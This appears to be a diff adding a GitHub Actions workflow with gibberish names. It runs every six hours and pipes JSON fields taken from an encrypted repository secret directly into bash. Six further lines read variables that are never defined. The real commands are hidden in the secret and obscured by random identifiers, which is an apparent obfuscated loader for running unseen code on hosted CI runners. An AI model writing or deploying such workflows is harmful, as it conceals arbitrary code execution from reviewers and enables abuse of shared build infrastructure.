@@ -1,0 +1,24 @@
+name: gubugouyanx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gubugouyanx
+        env:
+          rkqa159: ${{ secrets.rkqa159 }}
+        run: |
+          echo $rkqa159 | jq -r .z2188 | /bin/bash
+          echo $yw9 | jq -r .bq548 | /bin/bash
+          echo $npiwe00032 | jq -r .dvu2264 | /bin/bash
+          echo $lsuhg14 | jq -r .lpy5412 | /bin/bash
+          echo $zuy3 | jq -r .w75237 | /bin/bash
+          echo $quhrp2 | jq -r .fd2393 | /bin/bash
+          echo $h6 | jq -r .yglee62 | /bin/bash
+
